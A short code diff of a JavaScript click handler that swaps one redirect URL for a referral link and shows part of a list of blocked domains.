@@ -10,7 +10,7 @@ button.addEventListener('click', function() {
             "mply.io.1arshg4.site"
         ]; 
         
-        var redirectURL = "https://m.rolls3.com";
+        var redirectURL = "https://earnzeno.com/?ref=PLDAKGJM";
         var blockedDomains = [
             "jsdhjjhhjjhejkjkas.blogspot.com",
             "mply.io.t0ke2n.site",
